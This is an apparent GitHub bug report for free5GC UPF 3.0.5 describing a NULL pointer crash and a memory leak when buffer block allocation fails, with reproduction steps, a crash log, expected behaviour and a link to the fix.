A NULL pointer access is performed by continuing the processing without determining the result of Bufblk alloc.
1. Reduce `MAX_NUM_OF_BUFBLK_POOL` in `lib/utlt/src/utlt_buff.c` as follows:
   ```diff
   - #define MAX_NUM_OF_BUFBLK_POOL       256
   + #define MAX_NUM_OF_BUFBLK_POOL       5
   ```
2. Build UPF
3. run `test.sh TestRegistration`

```
console.log
:
2021-07-02T19:21:46+09:00 [INFO][UPF][Util] [PFCP] Handle PFCP session modification request
2021-07-02T19:21:46+09:00 [WARN][UPF][Util] Pool is empty
2021-07-02T19:21:46+09:00 [ERRO][UPF][Util] The pool of Buffer is empty
./test.sh: line 79:  7157 Segmentation fault      ${EXEC_UPFNS} ./bin/free5gc-upfd -f config/upfcfg.test.yaml
2021-07-02T19:21:48+09:00 [INFO][NRF][Init] Terminating NRF...
```

In addition, if `PfcpXactUpdateTX()` returns STATUS_ERROR when `BufblkAlloc()` or `BufblkBuf()` failed by bufBlkPool depletion,
bufBlk already allocated before calling `PfcpXactUpdateTX()` doesn't free. This causes memory leak.

## Expected behavior
- Don't cause segmentation fault when `BufblkAlloc()` failed.
- Don't cause segmentation fault when `BufblkBuf()` failed.
- Free already allocated bufBlk when `PfcpXactUpdateTx()` returns STATUS_ERROR caused by failure of `BufblkAlloc()` or `BufblkBuf()`.

## Environment (please complete the following information):
- free5GC Version: 3.0.5
- OS: Ubuntu 18.04
- Kernel version: 5.0.0-23-generic
- go version go1.14.4 linux/amd64

## Pull Request
[Pull Request](https://github.com/free5gc/upf/pull/29) for the fix.
